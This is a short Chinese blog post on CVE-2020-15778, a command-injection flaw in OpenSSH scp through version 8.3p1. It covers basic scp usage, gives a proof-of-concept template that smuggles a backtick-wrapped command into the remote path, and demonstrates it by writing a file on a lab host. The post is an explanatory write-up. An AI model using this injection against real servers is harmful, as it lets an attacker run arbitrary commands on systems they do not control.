# （CVE-2020-15778）Openssh 命令注入漏洞 - 追得上的梦想 - 博客园

> 原文：[https://www.cnblogs.com/KHZ521/p/14639257.html](https://www.cnblogs.com/KHZ521/p/14639257.html)

### 前言

2020年6月9日，研究人员Chinmay Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。深信服安全研究团队依据漏洞重要性和影响力进行评估，作出漏洞通告。

### 漏洞影响

```
OpenSSH =< 8.3p1 
```

### SCP基础介绍

上传文件

```
scp C:\ST\CobaltStrike\CobaltStrike.exe root@123.56.150.172:/home/ 
```

上传文件夹

```
scp -r C:\ST\CobaltStrike root@123.56.150.172:/home/ 
```

下载文件

```
scp root@123.56.150.172:/home/CobaltStrike/CobaltStrike.jar C:\Users\17107\Desktop\ 
```

下载文件夹

```
scp -r root@123.56.150.172:/home/CobaltStrike/ C:\Users\17107\Desktop\ 
```

### 漏洞利用

POC

```
scp 1.txt root@<IP地址>:'`<需要执行的命令>`/tmp/1.txt' 
```

1.查看版本是否存在漏洞

```
ssh -V 
```

![](../Images/b22797b794a52d77b23aefe45cddab19.png)
2.查看文件夹并不存在1.txt和123.txt文件
![](../Images/9e3fb7472e8e48887865fa8b7630dac2.png)
3.执行EXP尝试注入echo命令并写入123.txt文件
`scp 1.txt root@192.168.245.128:'`echo 123>/tmp/123.txt`/tmp/1.txt'`
![](../Images/bf47b471ea4db7a959c73f6cc2746cc1.png)
4.查看文件结果，scp和echo同时执行成功
![](../Images/3fd5f4656079d3fe2fec03a191d54b8d.png)